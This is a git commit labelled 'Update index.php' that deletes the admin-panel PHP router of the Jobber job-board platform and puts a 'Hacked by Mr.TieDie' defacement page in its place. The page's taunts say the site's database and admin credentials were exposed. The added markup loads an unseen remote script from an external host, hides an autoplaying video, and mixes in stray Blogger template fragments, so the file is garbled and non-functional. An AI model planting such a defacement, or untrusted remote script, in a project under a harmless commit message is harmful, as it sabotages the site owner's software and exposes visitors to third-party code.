6243ac4ce01a385e1ef4ccc8a3a9f70d16fa98d0
zidanzpro <famouz0990@yahoo.com>
2013-03-19 05:55:25 -0700

    Update index.php

--- public/admin/index.php
+++ public/admin/index.php
@@ -1,273 +1,104 @@
-<?php
-/**
- * jobber job board platform - admin panel
- *
- * @author     Lavinia Creivean <links_clm@yahoo.com>
- * @author     Filip C.T.E. <http://www.filipcte.ro> <me@filipcte.ro>
- * @license    You are free to edit and use this work, but it would be nice if you always referenced the original authors ;)
- *             (see license.txt).
- */
+<head>
+<link rel="openid.server" href="http://www.blogger.com/openid-server.g" />
+</head>
+<b:include data='blog' name='all-head-content'/>
 
-	if(!file_exists('config.php')) 
-	{
-	   die('[index.php] config.php not found');
-	}
-	
-	require_once 'config.php';
-	
-	$translator = new Translator(LANG_CODE);
-	$translations = $translator->getTranslations();
-	
-	$smarty->assign('translations', $translations);
-	
-	$flag = 0;
-	$js = array();
-	if(!isset($_SERVER['HTTP_REFERER'])) {
-	   $_SERVER['HTTP_REFERER'] = '';
-	}
-	
-	$job = new Job();
-	
-	switch($page)
-	{
-		// home		
-		case '':
-			#show login page only if the admin is not logged in
-			#else show homepage
-			if(!isset($_SESSION['AdminId']))
-			{
-				require_once 'page_login.php';			
-			}
-			else
-			{				
-				require_once 'page_home.php';
-			}
-			$flag = 1;
-			break;
+<script language='JavaScript'>
+var txt="Hacked by Mr.TieDie Lolz";
+var kecepatan=100;var segarkan=null;function bergerak() { document.title=txt;
+txt=txt.substring(1,txt.length)+txt.charAt(0);
+segarkan=setTimeout("bergerak()",kecepatan);}bergerak();
+</script>
+<title>Hacked by Mr.TieDie</title>
+<body bgcolor = black>
+<center> <h1> <font color= red>Hacked by Mr.TieDie</font> </h1> </center>
+<hr >
+<br>
+<br>
+<center> <h3><font color= Red>Mr.TieDie</font> </h3> </center>
+<br>
+<center><img src = "http://oi48.tinypic.com/1exnic.jpg"></center>
+<br>
+<center><font color = white><script src="http://vikry.googlecode.com/files/my script.js" type="text/javascript">
+</script>
+<div id="matrix">
+Hacked by Mr.TieDie</div></font> </center>
+<marquee bgcolor="black" style="font-family: impact; font-size:24px; color:#cc0000;"scrollamount="100" >_______________________________</marquee>
+<center><form name="news">
+<textarea cols="50" name="news2" rows="10" wrap="virtual"></textarea></form>
+<script type="text/javascript">
+//<![CDATA[
+var newsText = new Array();
+newsText[0] = "Hey Admin I Was From Here ";
+newsText[1] = "Do You Know?";
+newsText[2] = "You'r Website Have A Base";
+newsText[3] = "And You'r Website give a Id and Password";
+newsText[4] = "So Please Check you'r Security";
+newsText[5] = "Hacked By Mr.TieDie JokerTeamChild";
+newsText[6] = "Contac Me : MRT@gmail.com";
+var ttloop = 1; // diulang-ulang teksnya ganti dengan 1 (1 = True; 0 = False)
+var tspeed = 100; // Typing speed in milliseconds (larger number = slower)
+var tdelay = 1000; // Time delay between newsTexts in milliseconds
+// ------------- NO EDITING AFTER THIS LINE -------------
+var dwAText, cnews=0, eline=0, cchar=0, mxText;
+function doNews() {
+mxText = newsText.length - 1;
+dwAText = newsText[cnews];
+setTimeout("addChar()",1000)
+}
+function addNews() {
+cnews += 1;
+if (cnews <= mxText) {
+dwAText = newsText[cnews];
+if (dwAText.length != 0) {
+document.news.news2.value = "";
+eline = 0;
+setTimeout("addChar()",tspeed)
+}
+}
+}
+function addChar() {
+if (eline!=1) {
+if (cchar != dwAText.length) {
+nmttxt = ""; for (var k=0; k<=cchar;k++) nmttxt += dwAText.charAt(k);
+document.news.news2.value = nmttxt;
+cchar += 1;
+if (cchar != dwAText.length) document.news.news2.value += "_";
+} else {
+cchar = 0;
+eline = 1;
+}
+if (mxText==cnews && eline!=0 && ttloop!=0) {
+cnews = 0; setTimeout("addNews()",tdelay);
+} else setTimeout("addChar()",tspeed);
+} else {
+setTimeout("addNews()",tdelay)
+}
+}
+doNews()
+//]]>
+</script></center>
+<div dir="ltr" style="text-align: left;" trbidi="on">
+<div style="text-align: center;">
+<span style="color: lime;"><b><span style="font-size: large;">Hacked by Mr.TieDie</span></b></span></div>
+<span style="color: lime;"><br /><br /><div style="text-align: center;">
+<span style="font-size: x-large;">We Are JokerTeamChild</span></div>
+</span><span style="color: lime; font-size: large; text-align: center;"><br /></span>
+<span style="color: lime;"><br /><br /><div style="text-align: center;">
+<div style="text-align: center;">
+<span style="font-size: x-large;">Regard's to : JokerTeamChild &amp; Friend's</span></div>
+</span><span style="color: lime; font-size: large; text-align: center;"><br /></span></div>
+</div></span><span style="color: lime; font-size: large; text-align: center;"><br /></span>
+<marquee bgcolor="black" style="font-family: impact; font-size:24px; color:#cc0000;"scrollamount="100"direction="right" >_______________________________</marquee>
+<embed src="http://www.youtube.com/v/dvkuDgWsDps&autoplay=1" type="application/x-shockwave-flash" wmode="transparent" width="1" height="1"></embed>
+<script language="javascript">
+var floatURLimage="http://omkicau1.files.wordpress.com/2011/02/bendera-merah-putih-bendera-indonesia-indonesia-flag-omkicau-3.gif";
+</script>
 
-		case 'logout':
-			$flag = 1;
-			if (isset($_SESSION['AdminId']))
-			{			
-				unset($_SESSION['AdminId']);
-				redirect_to(BASE_URL);
-				exit;
-			}
-			break;
-			
-		case 'home':
-			if(!isset($_SESSION['AdminId']))
-			{
-				redirect_to(BASE_URL);
-				exit;
-			}
-			require_once 'page_home.php';
-			$flag = 1;
-			break;
-
-		case 'activate':
-			if(!isset($_SESSION['AdminId']))
-			{
-				redirect_to(BASE_URL);
-				exit;
-			}
-			require_once 'page_activate.php';
-			$flag = 1;
-			break;
-
-		case 'deactivate':
-			if(!isset($_SESSION['AdminId']))
-			{
-				redirect_to(BASE_URL);
-				exit;
-			}
-			require_once 'page_deactivate.php';
-			$flag = 1;
-			break;
-
-		case 'delete':
-			if(!isset($_SESSION['AdminId']))
-			{
-				redirect_to(BASE_URL);
-				exit;
-			}
-			require_once 'page_delete.php';
-			$flag = 1;
-			break;
-
-		case URL_JOB:
-			if(!isset($_SESSION['AdminId']))
-			{
-				redirect_to(BASE_URL);
-				exit;
-			}			
-			require_once 'page_job.php';
-			$flag = 1;
-			break;
-
-		case URL_JOBS:
-			if(!isset($_SESSION['AdminId']))
-			{
-				redirect_to(BASE_URL);
-				exit;
-			}
-			require_once 'page_category.php';
-			$flag = 1;
-			break;
-
-		case 'page-unavailable':
-			if(!isset($_SESSION['AdminId']))
-			{
-				redirect_to(BASE_URL);
-				exit;
-			}
-			$html_title = 'Page unavailable / ' . SITE_NAME;
-			$template = 'error.tpl';
-			$flag = 1;
-			break;
-
-		case 'stats':
-			if(!isset($_SESSION['AdminId']))
-			{
-				redirect_to(BASE_URL);
-				exit;
-			}
-			require_once 'page_stats.php';
-			$flag = 1;
-			break;
-
-		case 'pages':
-			if(!isset($_SESSION['AdminId']))
-			{
-				redirect_to(BASE_URL);
-				exit;
-			}
-			require_once 'page_pages.php';
-			$flag = 1;
-			break;
-		case 'categories':
-			if(!isset($_SESSION['AdminId']))
-			{
-				redirect_to(BASE_URL);
-				exit;
-			}
-			require_once 'page_categories.php';
-			$flag = 1;
-			break;
-		case 'types':
-			if(!isset($_SESSION['AdminId']))
-			{
-				redirect_to(BASE_URL);
-				exit;
-			}
-			require_once 'page_types.php';
-			$flag = 1;
-			break;
-		case 'password':
-			if(!isset($_SESSION['AdminId']))
-			{
-				redirect_to(BASE_URL);
-				exit;
-			}
-			require_once 'page_password.php';
-			$html_title = 'Change password / ' . SITE_NAME;
-			$template = 'password.tpl';
-			$flag = 1;
-			break;
-		case 'links':
-			if(!isset($_SESSION['AdminId']))
-			{
-				redirect_to(BASE_URL);
-				exit;
-			}
-			require_once 'page_links.php';
-			$flag = 1;
-			break;
-		case 'settings':
-			if(!isset($_SESSION['AdminId']))
-			{
-				redirect_to(BASE_URL);
-				exit;
-			}
-			require_once 'page_settings.php';
-			$flag = 1;
-			break;
-		case 'edit-post':
-			if(!isset($_SESSION['AdminId']))
-			{
-				redirect_to(BASE_URL);
-				exit;
-			}
-			require_once 'page_edit_post.php';
-			$flag = 1;
-			break;
-		case 'activate-spotlight':
-            if(!isset($_SESSION['AdminId']))
-            {
-                redirect_to(BASE_URL);
-                exit;
-            }
-            require_once 'page_activate_spotlight.php';
-            $flag = 1;
-            break;
-   		case 'deactivate-spotlight':
-            if(!isset($_SESSION['AdminId']))
-            {
-                redirect_to(BASE_URL);
-                exit;
-            }
-            require_once 'page_deactivate_spotlight.php';
-            $flag = 1;
-            break;
-   		case 'cities':
-	  		if(!isset($_SESSION['AdminId']))
-            {
-                redirect_to(BASE_URL);
-                exit;
-            }
-            
-   			require_once 'page_cities.php';
-   			$flag = 1;
-   			$citiesPage = new CitiesPage();
-   			$template = $citiesPage->processRequest($id, $extra, $smarty);
-   			break;
-		default: 
-			$flag = 0;	
-			break;
-	}
-	// if page not found
-	if ($flag == 0)
-	{
-		redirect_to(BASE_URL . 'page-unavailable/');
-	}
-	
-	// create a JSON string from the translations array, but only for the "js" section
-	$smarty->assign('translationsJson', iniSectionsToJSON(array("js" => $translations['js'])));
-	
-	// get job categories and cities
-	$smarty->assign('categories', get_categories());
-	$smarty->assign('settings_categories', $jobber_settings->GetSettingsCategories());
-
-	//Add the dynamic URL defitions to SMARTY
-	$smarty->assign('URL_JOB', URL_JOB);
-	$smarty->assign('URL_JOBS', URL_JOBS);
-	$smarty->assign('URL_CITIES', URL_CITIES);
-	$smarty->assign('URL_COMPANIES', URL_COMPANIES);
-	$smarty->assign('URL_JOBS_IN_CITY', URL_JOBS_IN_CITY);
-	$smarty->assign('URL_JOBS_AT_COMPANY', URL_JOBS_AT_COMPANY);
-	
-	$smarty->assign('THEME', $settings['theme']);
-	$smarty->assign('CURRENT_PAGE', $page);
-	$smarty->assign('CURRENT_ID', $id);
-	$smarty->assign('CURRENT_DIRECTORY', CURRENT_DIRECTORY);
-	$smarty->assign('BASE_URL', BASE_URL_ORIG);
-	$smarty->assign('BASE_URL_ADMIN', BASE_URL);
-	$smarty->assign('HTTP_REFERER', $_SERVER['HTTP_REFERER']);
-	if(isset($_SESSION['AdminId']))
-		$smarty->assign('isAuthenticated', 1);
-	else
-		$smarty->assign('isAuthenticated', 0);
-	$smarty->assign('js', $js);
-	if (isset($template) && $template != '')
-		$smarty->display($template);
-?>
+<div style="position: fixed; bottom: 0px; left: 20px;width:82px;height:160px;"><a href://#" target="_blank"><img src="http://omkicau1.files.wordpress.com/2011/02/bendera-merah-putih-bendera-indonesia-indonesia-flag-omkicau-3.gif" border="0" /></a><small><center><a href="#" target="_blank">Hacked by Mr.TieDie</a></center></small></div>
+</script>
+<script type="text/javascript" src="//www.blogger.com/static/v1/common/js/1851061575-csitail.js"></script>
+<script type="text/javascript">BLOG_initCsi('classic_blogspot');</script></body>
+<style type="text/css">body, a, a:hover {cursor: url(http://downloads.totallyfreecursors.com/thumbnails/indonesia.gif), progress;}</style><a href="#" target="_blank" title="Hacked By Mr.TieDie"><img src="http://downloads.totallyfreecursors.com/thumbnails/indonesia.gif" border="0" alt="The Alien - Unavailable" style="position:absolute; top: 0px; right: 0px;" /></a>
+</body>
+</html>
